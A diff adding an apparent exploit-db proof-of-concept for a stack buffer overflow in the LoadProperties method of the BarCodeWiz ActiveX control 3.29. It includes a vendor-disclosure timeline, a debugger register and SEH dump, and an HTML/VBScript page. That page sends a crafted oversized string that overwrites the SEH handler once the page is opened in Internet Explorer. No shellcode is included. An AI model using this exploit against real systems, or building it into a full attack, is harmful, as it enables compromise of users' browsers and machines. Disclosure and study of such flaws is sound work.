@@ -1,0 +1,80 @@
+# BarCodeWiz Barcode ActiveX Control 3.29 PoC (SEH)
+# Bug found: 24th July 2010
+# Found  by: loneferret
+# Software: http://www.barcodewiz.com/
+# Nods to exploit-db.com
+
+# Vulnerable file BarCodeWiz.dll
+# LoadProperties method
+
+# Tested on:
+# Windows XP Professional SP3 & Windows XP Home SP3
+# Internet Explorer 6 & Internet Explorer 7
+ 
+# Vendor contacted: 24th July 2010
+# Vendor first reply: 26th July 2010: Wanting more information
+# Vendor contacted: 26th July 2010: Sent 2 proof of concepts files
+# Vendor contacted: 29 July 2010: Asked for update
+# No Response from vendor: 30 July 2010
+# Public Release : 30 Juley 2010
+ 
+
+# CPU Registers Information
+#
+# EAX 7EFEFEFE
+# ECX 0013FBF8 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.................
+# EDX 41414141
+# EBX 01AB3D68
+# ESP 0013AC94
+# EBP 0013AD48
+# ESI 00000000
+# EDI 0013FFFD
+# EIP 1002F379 BarcodeW.1002F379
+# C 0  ES 0023 32bit 0(FFFFFFFF)
+# P 1  CS 001B 32bit 0(FFFFFFFF)
+# A 0  SS 0023 32bit 0(FFFFFFFF)
+# Z 1  DS 0023 32bit 0(FFFFFFFF)
+# S 0  FS 003B 32bit 7FFDF000(FFF)
+# T 0  GS 0000 NULL
+# D 0
+# O 0  LastErr ERROR_SUCCESS (00000000)
+# EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
+# ST0 empty -??? FFFF 00690069 00690069
+# ST1 empty -??? FFFF 00F000F0 00F000F0
+# ST2 empty -??? FFFF 00690058 00570054
+# ST3 empty -??? FFFF 00EF00C9 00C600C1
+# ST4 empty -NAN FFFF FFD9D7D2 FFEEEDEB
+# ST5 empty -??? FFFF 00F000C9 00C700C2
+# ST6 empty 1.0000000000000000000
+# ST7 empty 2838.0000000000000000
+#                 3 2 1 0      E S P U O Z D I
+# FST 4000  Cond 1 0 0 0  Err 0 0 0 0 0 0 0 0  (EQ)
+# FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+# SEH Information
+#
+# SEH chain of main thread, item 0
+#  Address=0013E574
+#  SE handler=41414141
+
+
+# SEH is overwritten starting at the 101th position of our buffer.
+
+----HTML FILE FROM HERE ON-----
+<html>
+<object classid='clsid:CD3B09F1-26FB-41CD-B3F2-E178DFD3BCC6' id='target'></object>
+<script language='vbscript'>
+
+buffer = String(101,"A")
+SEH = String(4, "B")
+buffer2 = String(1895, "C")
+
+arg1 = buffer + SEH + buffer2
+
+target.LoadProperties arg1
+
+ 
+</script>
+
+Barcodewiz 3.29
+</html>
